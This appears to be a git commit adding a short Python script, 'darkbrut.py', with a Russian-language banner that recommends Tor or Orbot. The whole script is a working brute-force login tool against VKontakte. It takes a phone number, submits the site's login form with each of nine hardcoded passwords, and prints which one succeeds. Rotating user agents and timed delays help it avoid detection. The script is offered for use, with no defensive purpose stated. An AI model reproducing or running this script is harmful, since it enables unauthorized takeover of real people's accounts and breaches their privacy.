7663fb824b43f883142f606692c1aac44f600292
Naruto Uzumaki <63100566+BlackHungryDragon@users.noreply.github.com>
2020-07-03 09:18:16 +0300

    darkbrut.py

---
+++ darkbrut.py
@@ -0,0 +1,37 @@
+import lxml.html
+import requests,random,time
+banner ="""
+
+   ╔═╦═╦╦╦╦╦═╦╦╦╗╔╦══╗
+   ║╠║╩║╔╣═╣╣╣╔╣╚╝╠╗╔╝
+   ╚═╩╩╩╝╚╩╩═╩╝╚══╝╚╝═
+
+ В целях  вашей безопастности ,используйте tor или orbot.
+"""
+print(banner)
+
+password =['saharbelov','saharbelov1','saharbelow3','iunderstand','iunderstoond','Adgjlxvn1','ADhkxvnm','Adgjlxvn3','Adgjlxvn2']
+login = input(" Телефон :")
+
+url ="https://vk.com/"
+print("[ Номер телефона| Работает | Пароль ]")
+for passw in password:
+   time.sleep(10)
+   user_agents=['AndroidDownloadManager/6.0 (Linux; U; Android 6.0; DIG-L21HN Build/HUAWEIDIG-L21HN)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36']
+   user_agent=random.choice(user_agents)
+   headers = {
+    'User-Agent': user_agent
+}
+   session = requests.session()
+   data = session.get(url, headers=headers)
+   page = lxml.html.fromstring(data.content)
+   form = page.forms[0]
+   form.fields['email'] = login
+   form.fields['pass'] = passw
+   response = session.post(form.action, data=form.form_values())
+   check='onLoginDone' in response.text
+   if check == True:
+      print(f"[ {login} | Да | {passw} ]")
+      break
+   elif check ==False:
+      print(f"[ {login} | Нет | {passw} ]")
